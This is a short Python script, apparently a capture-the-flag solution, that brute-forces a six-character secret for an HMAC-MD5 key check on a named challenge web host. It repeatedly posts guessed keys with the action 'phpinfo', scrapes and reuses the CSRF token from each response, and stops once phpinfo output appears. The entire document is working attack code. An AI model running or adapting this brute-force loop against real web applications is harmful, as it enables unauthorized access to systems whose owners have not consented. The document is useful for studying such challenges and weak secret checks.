#coding =utf8

import hmac
import hashlib
import requests
import re
import random

request = requests.Session()

act = 'phpinfo'
CSRF_TOKEN = 1

def rand(c=6):
   l = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
   return ''.join([random.choice(l) for v in range(6)])

while CSRF_TOKEN:
    sec = rand().encode()
    key = hmac.new(sec, act.encode(), digestmod=hashlib.md5).hexdigest()
    url = "http://0dac0a717c3cf340e.jie.sangebaimao.com:82/"
    data = {"submit":1,"key":key,"act":act,"CSRF_TOKEN":CSRF_TOKEN}
    req = request.post(url,data).content.decode()
    if req.find('history.back')==-1:
        CSRF_TOKEN = re.findall(r'value="(.*?)">',req)[2]
    print(req)
    print(key,sec,CSRF_TOKEN)
    if req.find('System')!=-1:
        break
